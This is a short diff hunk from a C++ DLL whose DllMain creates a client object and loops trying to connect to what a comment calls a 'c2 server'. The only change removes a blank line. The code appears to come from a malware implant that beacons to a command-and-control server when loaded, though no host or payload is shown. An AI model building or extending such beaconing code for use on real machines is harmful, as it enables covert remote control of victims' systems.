@@ -42,7 +42,6 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
         std::unique_ptr<Client> me = std::make_unique<Client>();
         bool connected = false;
-
         do {
             //try to connect to c2 server
             connected = me->Connect();
